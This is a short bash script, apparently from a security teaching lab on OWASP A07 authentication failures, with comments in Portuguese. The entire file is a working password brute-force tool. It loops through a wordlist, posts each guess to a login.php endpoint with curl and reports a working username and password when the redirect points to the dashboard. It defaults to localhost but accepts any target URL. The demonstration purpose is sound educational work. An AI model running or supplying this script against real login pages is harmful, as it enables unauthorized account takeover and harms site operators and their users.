#!/usr/bin/env bash
#
# A07:2025 — Authentication Failures
# Brute force simples contra /login.php. Funciona porque o app NÃO tem
# rate limit, lockout, atraso nem CAPTCHA: dá pra testar a wordlist inteira.
#
# Uso:   bash attack/bruteforce.sh [usuario] [url_base]
# Ex.:   bash attack/bruteforce.sh admin http://localhost:8000
#
set -euo pipefail

USER="${1:-admin}"
BASE="${2:-http://localhost:8000}"
WORDLIST="$(dirname "$0")/wordlist.txt"

echo "[*] Alvo:    $BASE/login.php"
echo "[*] Usuário: $USER"
echo "[*] Senhas:  $(wc -l < "$WORDLIST") candidatas (sem rate limit -> tudo passa)"
echo

while IFS= read -r pass; do
    [ -z "$pass" ] && continue
    # login.php redireciona p/ dashboard.php em caso de sucesso, index.php em caso de falha.
    location=$(curl -s -i -o /dev/null -w '%{redirect_url}' \
        --data-urlencode "username=$USER" \
        --data-urlencode "password=$pass" \
        "$BASE/login.php")
    if [[ "$location" == *"dashboard.php"* ]]; then
        echo "[+] SENHA ENCONTRADA -> $USER : $pass"
        exit 0
    else
        echo "    [-] $pass"
    fi
done < "$WORDLIST"

echo
echo "[!] Nenhuma senha da wordlist funcionou."
exit 1
